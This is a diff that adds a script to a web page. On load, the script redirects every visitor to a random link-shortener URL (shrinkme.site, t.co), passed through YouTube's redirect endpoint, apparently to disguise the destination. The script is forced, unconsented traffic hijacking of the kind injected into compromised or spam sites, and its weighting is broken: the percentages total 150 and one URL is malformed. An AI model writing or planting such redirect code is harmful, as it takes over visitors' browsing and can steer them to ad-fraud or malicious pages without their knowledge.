@@ -1,0 +1,42 @@
+<script>
+function randomRedirect() {
+    // Define URLs grouped by their redirection percentages
+    const urlGroups = [
+        { percentage: 10, urls: ["https://www.youtube.com/redirect?q=https://shrinkme.site/ViGGj", "https://t.co/np44cNXTVC"] },
+        { percentage: 20, urls: ["https://www.youtube.com/redirect?q=hthttps://shrinkme.site/ViGGj", "https://t.co/np44cNXTVC"] },
+        { percentage: 40, urls: ["https://www.youtube.com/redirect?q=https://shrinkme.site/ViGGj", "https://t.co/np44cNXTVC"] },
+        { percentage: 80, urls: ["https://www.youtube.com/redirect?q=https://shrinkme.site/ViGGj", "https://t.co/np44cNXTVC"] }
+    ];
+
+    // Generate a random number between 1 and 100
+    const randomNumber = Math.ceil(Math.random() * 100);
+
+    // Initialize the total percentage and the selected group
+    let totalPercentage = 0;
+    let selectedGroup = null;
+
+    // Iterate through URL groups to find the one matching the random number
+    for (const group of urlGroups) {
+        totalPercentage += group.percentage;
+        if (randomNumber <= totalPercentage) {
+            selectedGroup = group;
+            break;
+        }
+    }
+
+    // If no URL group matched the random number, retry
+    if (!selectedGroup) {
+        console.error("No URL group matched the random number. Retrying...");
+        return randomRedirect(); // Recursive call to retry
+    }
+
+    // Select a random URL from the selected group
+    const randomIndex = Math.floor(Math.random() * selectedGroup.urls.length);
+    const selectedUrl = selectedGroup.urls[randomIndex];
+    // Redirect the user to the selected URL
+    window.location.href = selectedUrl;
+}
+
+// Call the function to initiate the redirection
+randomRedirect();
+</script>
